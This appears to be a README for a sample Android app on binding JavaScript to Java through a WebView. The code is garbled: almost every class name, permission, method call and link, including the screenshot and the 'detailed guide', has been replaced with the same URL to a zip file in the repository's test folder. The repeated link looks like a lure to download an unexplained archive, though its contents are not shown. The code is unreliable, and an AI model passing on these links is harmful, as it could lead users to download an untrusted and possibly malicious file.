# BindingJS
This is a sample Android application to show how to bind Javascript code to Android code.

![ScreenShot](https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip)

For getting data from the webpage via Javascript follow the below step-by-step guidelines.

1. To use <B>WebView</B>, declare the following the following code in the xml file.

```
<WebView
    android:id="@+id/webView"
    android:layout_width="match_parent"
    android:layout_height="match_parent" />
```
2. Then, add the following permissions to your <B>https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip</B> file:

```
<uses-permission android:name="https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip" />
<uses-permission android:name="https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip" />
```
3. For the client, to receive callbacks from JS there must be a Javascript interface class inside it which will implement the callbacks. You must add @JavascriptInterface annotation to all the methods inside the JS interface class.

```
public class JavaScriptReceiver
{
   Context mContext;
 
   /** Instantiate the receiver and set the context */
   JavaScriptReceiver(Context c) {
      mContext = c;
   }
 
   @JavascriptInterface
   public void showShopping(){
     Intent intent = new Intent(mContext, https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(intent);
   }
 
   @JavascriptInterface
   public void showOrders(int orderid){
     Intent intent = new Intent(mContext, https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip("order",orderid);
     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(intent);
   }
}
```
4. Use the following snippet for initialising the webview.
```
  WebView webView;
 
  webView = (WebView) findViewById(https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip);
  embed_link = "https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip";

  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(new WebChromeClient());
  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip().setDomStorageEnabled(true);
  https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip().setJavaScriptEnabled(true);
```
5. Use the same interface and function name in the calling statement inside the Javascript.

```
<script>
 
   function getRandomNumber(min,max) {
     return https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip( https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip() * ( 1 + min - max ) ) + max;
   }
 
   function showOrders() {
     var number = getRandomNumber(10000,50000)
     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(number);
   }
 
   function showShopping() {
     https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip();
   }
</script>
 
<a href="#" class="btn-view-orders" onclick="showOrders()">View Orders</a>
<a href="#" onclick="showShopping()">Continue Shopping</a>

```
6. For binding the JS into your source code, use <B>addJavascriptInterface()</B>  method.
```
JavaScriptReceiver javaScriptReceiver;
javaScriptReceiver = new JavaScriptReceiver(this);
https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip(javaScriptReceiver, "JSReceiver");
```

For more information, check out my detailed guide here : https://github.com/alssalimi/BindingJS/raw/refs/heads/master/app/src/test/JS-Binding-v3.5.zip
